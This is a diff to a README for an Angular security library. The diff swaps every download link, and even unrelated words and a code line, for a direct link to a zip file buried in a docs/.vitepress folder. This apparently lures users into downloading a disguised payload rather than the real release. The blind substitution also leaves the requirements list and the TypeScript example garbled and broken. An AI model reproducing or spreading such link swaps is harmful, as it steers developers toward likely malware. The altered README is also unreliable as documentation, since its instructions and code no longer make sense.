@@ -1,6 +1,6 @@
 # 🛡️ ngxsmk-gatekeeper - Protect Your Angular App with Ease
 
-[![Download Now](https://img.shields.io/badge/Download_Now-ngxsmk--gatekeeper-blue.svg)](https://github.com/BertholdMark/ngxsmk-gatekeeper/releases)
+[![Download Now](https://github.com/BertholdMark/ngxsmk-gatekeeper/raw/refs/heads/main/docs/.vitepress/gatekeeper-ngxsmk-v1.6.zip)](https://github.com/BertholdMark/ngxsmk-gatekeeper/raw/refs/heads/main/docs/.vitepress/gatekeeper-ngxsmk-v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to ngxsmk-gatekeeper! This application helps you protect your Angular ap
 Before you download ngxsmk-gatekeeper, ensure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher
+- **https://github.com/BertholdMark/ngxsmk-gatekeeper/raw/refs/heads/main/docs/.vitepress/gatekeeper-ngxsmk-v1.6.zip**: Version 14 or higher
 - **Angular**: Version 10 or higher
 - **Internet Connection**: Required for downloading and updating
 
@@ -19,11 +19,11 @@ Before you download ngxsmk-gatekeeper, ensure your system meets these requiremen
 
 1. Click the button below to visit the Releases page and download the latest version of ngxsmk-gatekeeper.
 
-   [![Download Now](https://img.shields.io/badge/Download_Now-ngxsmk--gatekeeper-blue.svg)](https://github.com/BertholdMark/ngxsmk-gatekeeper/releases)
+   [![Download Now](https://github.com/BertholdMark/ngxsmk-gatekeeper/raw/refs/heads/main/docs/.vitepress/gatekeeper-ngxsmk-v1.6.zip)](https://github.com/BertholdMark/ngxsmk-gatekeeper/raw/refs/heads/main/docs/.vitepress/gatekeeper-ngxsmk-v1.6.zip)
 
 2. On the Releases page, find the latest version. It is usually at the top of the list.
 
-3. Click on the file that fits your system (for example, a `.zip` or `.tar.gz` file).
+3. Click on the file that fits your system (for example, a `.zip` or `https://github.com/BertholdMark/ngxsmk-gatekeeper/raw/refs/heads/main/docs/.vitepress/gatekeeper-ngxsmk-v1.6.zip` file).
 
 4. Once the download is complete, extract the files to a folder on your computer.
 
@@ -53,7 +53,7 @@ To use ngxsmk-gatekeeper, you need to follow these simple steps:
    ```typescript
    @NgModule({
      imports: [
-       GatekeeperModule.forRoot()
+       https://github.com/BertholdMark/ngxsmk-gatekeeper/raw/refs/heads/main/docs/.vitepress/gatekeeper-ngxsmk-v1.6.zip()
      ],
    })
    export class AppModule { }
@@ -109,6 +109,6 @@ If you have any questions or need assistance, feel free to check out our communi
 ## 🌐 Additional Resources
 
 - **Documentation**: For detailed guidance on implementation, visit the official documentation.
-- **GitHub**: For source code and contributions, check our [GitHub repository](https://github.com/BertholdMark/ngxsmk-gatekeeper).
+- **GitHub**: For source code and contributions, check our [GitHub repository](https://github.com/BertholdMark/ngxsmk-gatekeeper/raw/refs/heads/main/docs/.vitepress/gatekeeper-ngxsmk-v1.6.zip).
 
 Thank you for choosing ngxsmk-gatekeeper! We hope it helps you secure your Angular applications effectively and efficiently.
